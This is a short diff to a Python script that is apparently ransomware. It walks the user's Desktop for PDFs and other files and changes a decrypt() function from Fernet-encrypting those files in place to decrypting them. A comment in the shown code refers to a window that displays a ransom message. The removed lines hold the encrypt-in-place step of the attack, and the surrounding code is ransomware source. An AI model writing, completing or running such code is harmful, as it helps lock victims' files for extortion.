@@ -37,11 +37,11 @@ def decrypt():
             f = Fernet(k)
 
             with open(f_name, "rb") as file:
-                file_data = file.read()
-                encrypted_data = f.encrypt(file_data)
+                encrypted_data = file.read()
 
+            decrypted_data = f.decrypt(encrypted_data)
             with open(f_name, "wb") as file:
-                file.write(encrypted_data)
+                file.write(decrypted_data)
 
         path = 'C:/Users/' + usr + '/Desktop'
         for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
@@ -53,11 +53,11 @@ def decrypt():
             f = Fernet(k)
 
             with open(f_name, "rb") as file:
-                file_data = file.read()
-                encrypted_data = f.encrypt(file_data)
+                encrypted_data = file.read()
 
+            decrypted_data = f.decrypt(encrypted_data)
             with open(f_name, "wb") as file:
-                file.write(encrypted_data)
+                file.write(decrypted_data)
 
             # this function prompts a window containing the ransom message
             window = tkinter.Tk()
